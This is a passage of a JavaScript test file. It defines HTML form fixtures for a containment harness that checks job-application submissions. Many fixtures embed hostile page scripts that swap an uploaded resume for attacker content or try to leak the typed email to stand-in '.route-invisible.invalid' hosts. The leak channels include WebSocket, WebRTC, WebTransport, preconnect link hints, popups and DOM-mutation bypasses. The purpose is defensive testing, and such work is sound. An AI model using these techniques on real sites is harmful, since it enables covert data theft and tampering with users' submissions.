  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">unassociated required star marker spoof fixture</div>`;

const nativeRequiredPayloadParityPage = (kind) => `<!doctype html><meta charset="utf-8"><title>Native required payload parity</title>
<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
  <label for="parity-email">Email</label><input id="parity-email" name="email" type="email">
  <label for="parity-resume">Resume</label><input id="parity-resume" name="resume" type="file">
  ${kind === 'disabled-choice' || kind === 'native-disabled-choice' || kind === 'mixed-choice'
    ? '<span id="parity-department-label">Department</span><div role="group" aria-labelledby="parity-department-label">'
    : ''}
  ${kind === 'disabled-choice' || kind === 'native-disabled-choice'
    ? '<label><input id="parity-required" type="' + (kind === 'disabled-choice' ? 'checkbox' : 'radio')
      + '" name="department" value="engineering" '
      + (kind === 'native-disabled-choice' ? 'required' : 'aria-required="true"') + '>Engineering</label>'
      + '<label><input type="' + (kind === 'disabled-choice' ? 'checkbox' : 'radio') + '" name="'
      + (kind === 'disabled-choice' ? 'sales-department' : 'department')
      + '" value="sales" checked disabled>Sales</label>'
    : ''}
  ${kind === 'mixed-choice'
    ? '<label><input id="parity-required" type="checkbox" name="department" value="engineering" aria-required="true">Engineering</label>'
      + '<label><input type="radio" name="department" value="sales" checked>Sales</label>'
    : ''}
  ${kind === 'disabled-choice' || kind === 'native-disabled-choice' || kind === 'mixed-choice'
    ? '</div>'
    : ''}
  ${kind === 'disabled-option' || kind === 'native-disabled-option'
    ? '<label for="parity-required">Department</label><select id="parity-required" name="department" '
      + (kind === 'native-disabled-option' ? 'required' : 'aria-required="true"') + '>'
      + '<option value="engineering" selected disabled>Engineering</option></select>'
    : ''}
  ${kind === 'disabled-optgroup' || kind === 'native-disabled-optgroup'
    ? '<label for="parity-required">Department</label><select id="parity-required" name="department" '
      + (kind === 'native-disabled-optgroup' ? 'required' : 'aria-required="true"') + '>'
      + '<optgroup label="Departments" disabled><option value="engineering" selected>Engineering</option></optgroup></select>'
    : ''}
  ${kind === 'empty-option'
    ? '<label for="parity-required">Department</label><select id="parity-required" name="department" aria-required="true">'
      + '<option value="  " selected>Choose a department</option></select>'
    : ''}
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">required payload parity fixture</div>`;

const NATIVE_OPTIONAL_HIDDEN_STAR = `<!doctype html><meta charset="utf-8"><title>Native optional hidden star</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="hidden-star-email">Email</label><input id="hidden-star-email" name="email" type="email">
  <label for="optional-portfolio" style="display: contents">Portfolio <span hidden>*</span></label>
  <input id="optional-portfolio" name="portfolio">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">optional hidden star fixture</div>`;

const nativeStarredLegendPage = (kind) => `<!doctype html><meta charset="utf-8"><title>Native starred legend</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="legend-email">Email</label><input id="legend-email" name="email" type="email">
  <fieldset><legend id="starred-legend">Department *</legend>
    ${kind === 'hidden'
      ? '<input type="hidden" name="department" value="engineering">'
      : '<label><input type="radio" name="department" value="sales" disabled>Sales</label>'
        + '<label><input type="radio" name="department" value="engineering" '
        + (kind === 'answered' ? 'checked' : '') + '>Engineering</label>'}
  </fieldset>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">starred legend fixture</div>`;

const NATIVE_CUSTOM_REQUIRED_MIXED_GROUP = `<!doctype html><meta charset="utf-8"><title>Native mixed required owner</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="mixed-owner-email">Email</label><input id="mixed-owner-email" name="email" type="email">
  <div id="mixed-required-owner" role="radiogroup" aria-required="true">
    <label><input type="radio" name="department" value="engineering">Engineering</label>
    <label><input type="checkbox" name="terms" value="yes" checked>Accept terms</label>
  </div>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">mixed required owner fixture</div>`;

const NATIVE_CUSTOM_REQUIRED_DISPLAY_CONTENTS = `<!doctype html><meta charset="utf-8"><title>Native display contents required owner</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="display-owner-email">Email</label><input id="display-owner-email" name="email" type="email">
  <div id="display-required-owner" role="group" aria-required="true" style="display: contents">
    <label for="display-owner-department">Department</label>
    <input id="display-owner-department" name="department" value="">
  </div>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">display contents required owner fixture</div>`;

const NATIVE_CUSTOM_REQUIRED_OVERSIZED_OWNER = `<!doctype html><meta charset="utf-8"><title>Native oversized required owner</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="oversized-owner-email">Email</label><input id="oversized-owner-email" name="email" type="email">
  <div id="oversized-required-owner" role="group" aria-required="true" style="display: contents">
    <input id="oversized-owner-department" name="department" value="">
  </div>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">oversized required owner fixture</div>
<script>
  var owner = document.getElementById('oversized-required-owner');
  for (var index = 0; index < 513; index += 1) owner.appendChild(document.createElement('span'));
</script>`;

const NATIVE_BARRED_REQUIRED_CONTROLS = `<!doctype html><meta charset="utf-8"><title>Native barred required controls</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="barred-email">Email</label><input id="barred-email" name="email" type="email">
  <input name="own_disabled" required disabled>
  <fieldset disabled><input name="fieldset_disabled" required></fieldset>
  <input name="readonly_value" required readonly>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">barred required controls fixture</div>`;

const nativeExternalRequiredOwnerPage = (kind) => `<!doctype html><meta charset="utf-8"><title>Native external required owner</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="external-email">Email</label><input id="external-email" name="email" type="email">
  <button id="send" type="submit">Submit application</button>
</form>
${kind === 'custom-empty' || kind === 'custom-answered'
    ? '<div id="external-required-owner" role="group" aria-required="true">Department'
      + '<input id="external-required-answer" type="hidden" name="department" form="application_form" value="'
      + (kind === 'custom-answered' ? 'engineering' : '') + '"></div>'
    : '<fieldset><legend id="external-required-owner" class="question_required_marker">Department</legend>'
      + '<input id="external-required-answer" name="department" form="application_form" value=""></fieldset>'}
<div id="submitted">external required owner fixture</div>`;

const nativeExternalAriaOwnsPage = (answered) => `<!doctype html><meta charset="utf-8"><title>Native external aria owns required owner</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="aria-owns-email">Email</label><input id="aria-owns-email" name="email" type="email">
  <button id="send" type="submit">Submit application</button>
</form>
<div id="aria-owns-required-owner" role="group" aria-required="true" aria-owns="department-backing">
  Department
</div>
<input id="department-backing" type="hidden" name="department" form="application_form"
  value="${answered ? 'engineering' : ''}">
<div id="submitted">external aria owns required owner fixture</div>`;

const nativeRequiredFieldsetPage = (answered) => `<!doctype html><meta charset="utf-8"><title>Native required fieldset owner</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="fieldset-email">Email</label><input id="fieldset-email" name="email" type="email">
  <fieldset id="required-fieldset" aria-required="true">
    <legend>Department</legend>
    <input id="fieldset-department" name="department" value="${answered ? 'engineering' : ''}">
  </fieldset>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">required fieldset fixture</div>`;

const NATIVE_ARIA_LABEL_DRIFT = `<!doctype html><meta charset="utf-8"><title>Native aria label drift</title>
<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" aria-label="Submit application" type="submit"></button>
</form><div id="submitted">aria label drift fixture</div>
<script>
  document.getElementById('send').addEventListener('pointerdown', function (event) {
    event.currentTarget.setAttribute('aria-label', 'Continue');
  });
</script>`;

const NATIVE_ARIA_LABEL_CHOICE_PROOF = `<!doctype html><meta charset="utf-8"><title>Native aria label choice proof</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="aria-choice-email">Email</label><input id="aria-choice-email" name="email" type="email">
  <fieldset><legend>Consent choice</legend>
    <input id="aria-choice-yes" type="radio" name="consent" value="1" aria-label="Yes">
  </fieldset>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">aria label choice fixture</div>`;

const NATIVE_UNSELECTED_IMAGE_CONTROL = `<!doctype html><meta charset="utf-8"><title>Native unselected image control</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="image-control-email">Email</label><input id="image-control-email" name="email" type="email">
  <input type="image" name="alternate" value="alternate" alt="Alternate action"
    src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">unselected image control fixture</div>`;

const NATIVE_USERINFO_ACTION = `<!doctype html><meta charset="utf-8"><title>Native userinfo action</title>
<form id="application_form" method="post">
  <label for="userinfo-email">Email</label><input id="userinfo-email" name="email" type="email">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">userinfo action fixture</div>
<script>
  document.getElementById('application_form').action = location.protocol + '//applicant:secret@'
    + location.host + '/native-integrity-real';
</script>`;

const NATIVE_LATE_FILE_GETTER_SUBSTITUTION = `<!doctype html><meta charset="utf-8"><title>Native late file substitution</title>
<form id="application_form" action="/native-file-integrity-real" method="post" enctype="multipart/form-data">
  <label for="late-email">Email</label><input id="late-email" name="email" type="email">
  <label for="late-resume">Resume</label><input id="late-resume" name="resume" type="file">
  <input id="late-getter-state" name="getter_state" type="hidden" value="not_called">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">late file substitution fixture</div>
<script>
  Object.defineProperty(document.getElementById('send'), 'innerText', {
    configurable: true,
    get: function () {
      document.getElementById('late-getter-state').value = 'called';
      var input = document.getElementById('late-resume');
      var original = input.files && input.files[0];
      if (original) {
        var transfer = new DataTransfer();
        transfer.items.add(new File(['attack'], original.name, {
          type: original.type,
          lastModified: original.lastModified
        }));
        input.files = transfer.files;
      }
      return 'Submit application';
    }
  });
</script>`;

const NATIVE_REVERSIBLE_FILE_PROOF_SWAP = `<!doctype html><meta charset="utf-8"><title>Native reversible file proof swap</title>
<form id="application_form" action="/native-file-integrity-real" method="post" enctype="multipart/form-data">
  <label for="reversible-email">Email</label><input id="reversible-email" name="email" type="email">
  <label for="reversible-resume">Resume</label><input id="reversible-resume" name="resume" type="file">
  <button id="arm-swap" type="button">Review attachment</button>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">reversible file proof fixture</div>
<script>
  var fileInput = document.getElementById('reversible-resume');
  var intendedFile = null;
  var attackerFile = null;
  var nativeArrayBuffer = File.prototype.arrayBuffer;
  fileInput.addEventListener('change', function () {
    intendedFile = fileInput.files && fileInput.files[0];
  });
  function install(file) {
    var transfer = new DataTransfer();
    transfer.items.add(file);
    fileInput.files = transfer.files;
  }
  document.getElementById('arm-swap').addEventListener('click', function () {
    attackerFile = new File(['attack'], intendedFile.name, {
      type: intendedFile.type,
      lastModified: intendedFile.lastModified
    });
    install(attackerFile);
    File.prototype.arrayBuffer = function () {
      var result = nativeArrayBuffer.call(intendedFile);
      install(intendedFile);
      return result;
    };
  });
  document.getElementById('send').addEventListener('pointerdown', function () {
    if (attackerFile) install(attackerFile);
  });
</script>`;

const nativeWebSocketPage = (phase) => `<!doctype html><meta charset="utf-8"><title>Native WebSocket containment</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">websocket fixture</div>
<script>
  function leak(stage) {
    var socket = new WebSocket('ws://' + location.host + '/v4-websocket');
    socket.addEventListener('open', function () { socket.send(stage + ':applicant@example.com'); });
  }
  if (${JSON.stringify(phase)} === 'pre-chooser') {
    document.getElementById('native-email').addEventListener('input', function () { leak('pre-chooser'); });
  }
  if (${JSON.stringify(phase)} === 'activation') {
    document.getElementById('send').addEventListener('pointerdown', function () { leak('activation'); });
  }
</script>`;

const nativeRouteInvisibleConstructorPage = (transport, phase) => `<!doctype html><meta charset="utf-8"><title>Native route-invisible constructor containment</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">route-invisible constructor fixture</div>
<div id="transport-state">not-attempted</div>
<script>
  function callerHostname(value) {
    return String(value).toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '')
      + '.route-invisible.invalid';
  }
  function attemptRouteInvisibleConstructor() {
    var value = document.getElementById('native-email').value;
    var state = document.getElementById('transport-state');
    if (${JSON.stringify(transport)} === 'rtc') {
      if (typeof globalThis.RTCPeerConnection !== 'function') {
        state.textContent = 'rtc:constructor-missing';
        return;
      }
      try {
        var peer = new RTCPeerConnection({
          iceServers: [{ urls: 'stun:' + callerHostname(value) + ':3478' }]
        });
        state.textContent = 'rtc:constructor-returned';
        var channel = peer.createDataChannel(value);
        state.textContent = 'rtc:data-channel-returned';
        channel.addEventListener('open', function () {
          state.textContent = 'rtc:send-reached';
          channel.send(value);
        });
        peer.createOffer().then(function (offer) {
          return peer.setLocalDescription(offer);
        }).catch(function () {});
      } catch (error) {
        state.textContent = state.textContent === 'not-attempted'
          ? 'rtc:constructor-blocked'
          : 'rtc:post-constructor-error';
      }
      return;
    }
    if (${JSON.stringify(transport)} === 'websocketstream') {
      if (typeof globalThis.WebSocketStream !== 'function') {
        state.textContent = 'websocketstream:constructor-missing';
        return;
      }
      try {
        var socketStream = new WebSocketStream('wss://' + callerHostname(value) + '/');
        state.textContent = 'websocketstream:constructor-returned';
        socketStream.opened.then(function (connection) {
          state.textContent = 'websocketstream:send-reached';
          return connection.writable.getWriter().write(value);
        }).catch(function () {});
      } catch (error) {
        state.textContent = 'websocketstream:constructor-blocked';
      }
      return;
    }
    if (${JSON.stringify(transport)} === 'serviceworker') {
      if (!navigator.serviceWorker || typeof navigator.serviceWorker.register !== 'function') {
        state.textContent = 'serviceworker:api-missing';
        return;
      }
      try {
        navigator.serviceWorker.register('/route-invisible-worker.js');
        state.textContent = 'serviceworker:register-returned';
      } catch (error) {
        state.textContent = 'serviceworker:register-blocked';
      }
      return;
    }
    if (typeof globalThis.WebTransport !== 'function') {
      state.textContent = 'webtransport:constructor-missing';
      return;
    }
    try {
      var transport = new WebTransport('https://' + callerHostname(value) + '/');
      state.textContent = 'webtransport:constructor-returned';
      transport.ready.then(async function () {
        state.textContent = 'webtransport:send-reached';
        var writer = transport.datagrams.writable.getWriter();
        await writer.write(new TextEncoder().encode(value));
      }).catch(function () {});
    } catch (error) {
      state.textContent = 'webtransport:constructor-blocked';
    }
  }
  if (${JSON.stringify(phase)} === 'pre-chooser') {
    document.getElementById('native-email').addEventListener('input', attemptRouteInvisibleConstructor, { once: true });
  }
  if (${JSON.stringify(phase)} === 'activation') {
    document.getElementById('send').addEventListener('pointerdown', attemptRouteInvisibleConstructor, { once: true });
  }
</script>`;

const NATIVE_POPUP_ROUTE_INVISIBLE = `<!doctype html><meta charset="utf-8"><title>Native popup route-invisible containment</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">popup route-invisible fixture</div>
<div id="transport-state">not-attempted</div>
<script>
  var transportPopup = null;
  try {
    transportPopup = window.open('about:blank', 'v4-route-invisible-popup');
  } catch (error) {
    document.getElementById('transport-state').textContent = 'popup-worker:blocked';
  }
  document.getElementById('native-email').addEventListener('input', function () {
    var state = document.getElementById('transport-state');
    if (!transportPopup) {
      state.textContent = 'popup-worker:blocked';
      return;
    }
    try {
      new transportPopup.Worker('data:text/javascript,postMessage(1)');
      state.textContent = 'popup-worker:constructor-returned';
    } catch (error) {
      state.textContent = 'popup-worker:blocked';
    }
  }, { once: true });
</script>`;

const NATIVE_DOCUMENT_OPEN_POPUP = `<!doctype html><meta charset="utf-8"><title>Native document open popup containment</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">document open popup fixture</div>
<div id="transport-state">not-attempted</div>
<script>
  document.getElementById('native-email').addEventListener('input', function () {
    try {
      var popup = document.open('about:blank', 'v4-document-open-popup', 'noopener');
      document.getElementById('transport-state').textContent = popup
        ? 'document-open-popup:usable'
        : 'document-open-popup:unexpected-return';
    } catch (error) {
      document.getElementById('transport-state').textContent = 'document-open-popup:blocked';
    }
  }, { once: true });
</script>`;

const NATIVE_DATA_FRAME_HINT = `<!doctype html><meta charset="utf-8"><title>Native data frame hint containment</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">data frame hint fixture</div>
<script>
  document.getElementById('native-email').addEventListener('input', function (event) {
    var encoded = encodeURIComponent(event.currentTarget.value.toLowerCase().replace(/[^a-z0-9]+/g, '-'));
    var frame = document.createElement('iframe');
    frame.addEventListener('load', function () {
      var ready = document.createElement('div');
      ready.id = 'data-frame-loaded';
      ready.textContent = 'loaded';
      document.body.appendChild(ready);
    }, { once: true });
    try {
      frame.src = 'data:text/html,<link rel="preconnect" href="https://' + encoded
        + '.route-invisible.invalid/">';
      document.body.appendChild(frame);
    } catch (error) {
      var ready = document.createElement('div');
      ready.id = 'data-frame-loaded';
      ready.textContent = 'blocked';
      document.body.appendChild(ready);
    }
  }, { once: true });
</script>`;

const NATIVE_DATA_POPUP_HINT = `<!doctype html><meta charset="utf-8"><title>Native data popup hint containment</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">data popup hint fixture</div>
<script>
  document.getElementById('native-email').addEventListener('input', function (event) {
    var encoded = encodeURIComponent(event.currentTarget.value.toLowerCase().replace(/[^a-z0-9]+/g, '-'));
    var opener = document.createElement('a');
    opener.target = '_blank';
    opener.rel = 'noopener';
    opener.href = 'data:text/html,<link rel="preconnect" href="https://' + encoded
      + '.route-invisible.invalid/">';
    document.body.appendChild(opener);
    opener.click();
    setTimeout(function () {
      var ready = document.createElement('div');
      ready.id = 'data-popup-attempted';
      ready.textContent = 'attempted';
      document.body.appendChild(ready);
    }, 300);
  }, { once: true });
</script>`;

const NATIVE_INITIAL_SCRIPT_TRANSPORT = `<!doctype html><meta charset="utf-8"><title>Native initial script transport containment</title>
<div id="transport-state">not-attempted</div>
<script>
  try {
    new WebSocketStream('wss://initial-script.route-invisible.invalid/');
    document.getElementById('transport-state').textContent = 'initial-websocketstream:usable';
  } catch (error) {
    document.getElementById('transport-state').textContent = 'initial-websocketstream:blocked';
  }
</script>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">initial script transport fixture</div>`;

const nativeRouteInvisibleHintPage = (rel, phase) => `<!doctype html><meta charset="utf-8"><title>Native route-invisible link hint containment</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">route-invisible link hint fixture</div>
<div id="transport-state">not-attempted</div>
<script>
  function attemptRouteInvisibleHint() {
    var callerValue = document.getElementById('native-email').value;
    var callerHost = String(callerValue).toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '')
      + '.route-invisible.invalid';
    var state = document.getElementById('transport-state');
    var hint = document.createElement('link');
    try {
      hint.rel = ${JSON.stringify(rel)};
      hint.href = 'https://' + callerHost + '/';
      document.head.appendChild(hint);
      state.textContent = hint.isConnected
        ? ${JSON.stringify(rel + ':hint-connected')}
        : ${JSON.stringify(rel + ':hint-blocked')};
    } catch (error) {
      state.textContent = hint.isConnected
        ? ${JSON.stringify(rel + ':hint-connected-after-throw')}
        : ${JSON.stringify(rel + ':hint-blocked')};
    }
  }
  if (${JSON.stringify(phase)} === 'pre-chooser') {
    document.getElementById('native-email').addEventListener('input', attemptRouteInvisibleHint, { once: true });
  }
  if (${JSON.stringify(phase)} === 'activation') {
    document.getElementById('send').addEventListener('pointerdown', attemptRouteInvisibleHint, { once: true });
  }
</script>`;

const nativeConnectedHintMutationPage = (mutation, phase) => `<!doctype html><meta charset="utf-8"><title>Native connected link hint mutation containment</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  ${[
    'safe-string-replace-children',
    'safe-class-list-token',
    'safe-markup-primitives',
    'stateful-rel-coercion',
    'closed-shadow-url-component'
  ].includes(mutation)
    ? '<input id="transport-state-field" name="transport_state" type="hidden" value="not-attempted">'
    : ''}
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">connected link mutation fixture</div>
<div id="transport-state">not-attempted</div><div id="shadow-host"></div>
${mutation === 'closed-shadow-large-fragment'
  ? '<template id="large-hint-fragment">'
    + Array.from({ length: 257 }, (_, index) => (
      '<link rel="preconnect" href="https://hint-' + index + '.route-invisible.invalid/">'
    )).join('')
    + '</template>'
  : ''}
${mutation === 'move-before'
  ? '<template id="move-before-fragment"><link rel="preconnect" href="https://move-before.route-invisible.invalid/">'
    + '<span id="move-before-marker"></span></template>'
  : ''}
${[
  'closed-shadow-href-attribute',
  'closed-shadow-href-named-map',
  'closed-shadow-url-component'
].includes(mutation)
  ? '<div id="declarative-hint-host"><template shadowrootmode="open">'
    + '<link rel="preconnect" href="'
    + (mutation === 'closed-shadow-url-component'
      ? '/native-get-exfil?channel=url-component&value=initial'
      : 'https://initial.route-invisible.invalid/')
    + '">'
    + '</template></div>'
  : ''}
<script>
  var transportStateOutput = document.getElementById('transport-state');
  var transportStateField = document.getElementById('transport-state-field');
  if (transportStateField) {
    new MutationObserver(function () {
      transportStateField.value = transportStateOutput.textContent;
    }).observe(transportStateOutput, { childList: true, characterData: true, subtree: true });
  }
  function encodedCallerHost() {
    return document.getElementById('native-email').value.toLowerCase()
      .replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '') + '.route-invisible.invalid';
  }
  function attemptConnectedHintMutation() {
    var state = document.getElementById('transport-state');
    var destination = 'https://' + encodedCallerHost() + '/';
    if (${JSON.stringify(mutation)} === 'safe-string-replace-children') {
      try {
        state.replaceChildren('safe-string-replace-children:allowed');
      } catch (error) {
        state.textContent = 'safe-string-replace-children:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'safe-markup-primitives') {
      try {
        var markupTarget = document.createElement('div');
        markupTarget.innerHTML = false;
        var falseValue = markupTarget.textContent;
        markupTarget.innerHTML = 0;
        state.textContent = falseValue === 'false' && markupTarget.textContent === '0'
          ? 'safe-markup-primitives:allowed'
          : 'safe-markup-primitives:changed';
      } catch (error) {
        state.textContent = 'safe-markup-primitives:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'exec-command-insert-html') {
      try {
        document.execCommand('insertHTML', false, '<link rel="preconnect" href="' + destination + '">');
        state.textContent = 'exec-command-insert-html:usable';
      } catch (error) {
        state.textContent = 'exec-command-insert-html:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'variadic-document-write') {
      try {
        document.write('<li', 'nk rel="preconnect" href="' + destination + '">');
        state.textContent = 'variadic-document-write:usable';
      } catch (error) {
        state.textContent = 'variadic-document-write:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'nested-iframe-srcdoc') {
      try {
        var inertFrameDocument = new DOMParser().parseFromString(
          '<div><iframe srcdoc="&lt;link rel=&quot;preconnect&quot; href=&quot;' + destination
            + '&quot;&gt;"></iframe></div>',
          'text/html'
        );
        var frameContainer = document.adoptNode(inertFrameDocument.querySelector('div'));
        hintShadow.replaceChildren(frameContainer);
        state.textContent = 'nested-iframe-srcdoc:usable';
      } catch (error) {
        state.textContent = 'nested-iframe-srcdoc:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'move-before') {
      var moveFragment = document.getElementById('move-before-fragment').content;
      try {
        moveFragment.moveBefore(
          moveFragment.querySelector('link'),
          moveFragment.getElementById('move-before-marker')
        );
        state.textContent = 'move-before:usable';
      } catch (error) {
        state.textContent = 'move-before:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'stateful-rel-coercion') {
      var coercionLink = document.createElement('link');
      coercionLink.href = destination;
      hintShadow.replaceChildren(coercionLink);
      var conversions = 0;
      var coercion = {
        toString: function () {
          conversions += 1;
          return conversions === 1 ? 'author' : 'preconnect';
        }
      };
      try {
        coercionLink.rel = coercion;
        state.textContent = coercionLink.rel === 'author' && conversions === 1
          ? 'stateful-rel-coercion:normalized'
          : 'stateful-rel-coercion:usable';
      } catch (error) {
        state.textContent = 'stateful-rel-coercion:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'safe-class-list-token') {
      try {
        state.classList.add('preconnect');
        state.classList.value = 'dns-prefetch';
        state.textContent = 'safe-class-list-token:allowed';
      } catch (error) {
        state.textContent = 'safe-class-list-token:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'closed-shadow-href-attribute') {
      var hrefAttributeHost = document.getElementById('declarative-hint-host').shadowRoot;
      var hrefAttributeLink = hrefAttributeHost.querySelector('link');
      try {
        hrefAttributeLink.setAttribute('href', destination);
        state.textContent = 'closed-shadow-href-attribute:usable';
      } catch (error) {
        state.textContent = 'closed-shadow-href-attribute:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'closed-shadow-href-named-map') {
      var hrefNamedHost = document.getElementById('declarative-hint-host').shadowRoot;
      var hrefNamedLink = hrefNamedHost.querySelector('link');
      try {
        var hrefDocument = new DOMParser().parseFromString(
          '<div href="' + destination + '"></div>',
          'text/html'
        );
        var hrefAttribute = hrefDocument.querySelector('div').getAttributeNode('href');
        hrefAttribute.ownerElement.removeAttributeNode(hrefAttribute);
        hrefNamedLink.attributes.setNamedItem(hrefAttribute);
        state.textContent = 'closed-shadow-href-named-map:usable';
      } catch (error) {
        state.textContent = 'closed-shadow-href-named-map:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'closed-shadow-url-component') {
      var componentHost = document.getElementById('declarative-hint-host').shadowRoot;
      var componentLink = componentHost.querySelector('link');
      var initialHref = componentLink.href;
      var initialHrefAttribute = componentLink.getAttribute('href');
      var expandoValue = '?applicant=' + encodeURIComponent(
        document.getElementById('native-email').value
      );
      try {
        componentLink.search = expandoValue;
        state.textContent = componentLink.href === initialHref
          && componentLink.getAttribute('href') === initialHrefAttribute
          && Object.prototype.hasOwnProperty.call(componentLink, 'search')
          && componentLink.search === expandoValue
          ? 'closed-shadow-url-component-expando:allowed'
          : 'closed-shadow-url-component-expando:changed';
      } catch (error) {
        state.textContent = 'closed-shadow-url-component-expando:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'closed-shadow-attr-node-value') {
      var nodeValueLink = document.createElement('link');
      nodeValueLink.rel = 'author';
      nodeValueLink.href = destination;
      hintShadow.replaceChildren(nodeValueLink);
      try {
        nodeValueLink.getAttributeNode('rel').nodeValue = 'preconnect';
        state.textContent = nodeValueLink.relList.contains('preconnect')
          ? 'closed-shadow-attr-node-value:usable'
          : 'closed-shadow-attr-node-value:unexpected-return';
      } catch (error) {
        state.textContent = 'closed-shadow-attr-node-value:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'closed-shadow-named-node-map') {
      var namedMapLink = document.createElement('link');
      namedMapLink.href = destination;
      hintShadow.replaceChildren(namedMapLink);
      try {
        var inertAttribute = new DOMParser().parseFromString(
          '<div rel="preconnect"></div>',
          'text/html'
        ).querySelector('div').getAttributeNode('rel');
        inertAttribute.ownerElement.removeAttributeNode(inertAttribute);
        namedMapLink.attributes.setNamedItem(inertAttribute);
        state.textContent = namedMapLink.relList.contains('preconnect')
          ? 'closed-shadow-named-node-map:usable'
          : 'closed-shadow-named-node-map:unexpected-return';
      } catch (error) {
        state.textContent = 'closed-shadow-named-node-map:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'closed-shadow-large-fragment') {
      var fragment = document.getElementById('large-hint-fragment').content;
      try {
        hintShadow.replaceChildren(fragment);
        state.textContent = hintShadow.querySelectorAll('link[rel~="preconnect"]').length > 0
          ? 'closed-shadow-large-fragment:usable'
          : 'closed-shadow-large-fragment:unexpected-return';
      } catch (error) {
        state.textContent = 'closed-shadow-large-fragment:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'closed-shadow-entity-inner-html') {
      try {
        hintShadow.innerHTML = '<link rel="pre&#x63;onnect" href="' + destination + '">';
        state.textContent = hintShadow.querySelector('link[rel~="preconnect"]')
          ? 'closed-shadow-entity-inner-html:usable'
          : 'closed-shadow-entity-inner-html:unexpected-return';
      } catch (error) {
        state.textContent = 'closed-shadow-entity-inner-html:blocked';
      }
      return;
    }
    if (${JSON.stringify(mutation)} === 'closed-shadow-replace-children') {
      try {
        var inert = new DOMParser().parseFromString(
          '<link rel="preconnect" href="' + destination + '">',
          'text/html'
        );
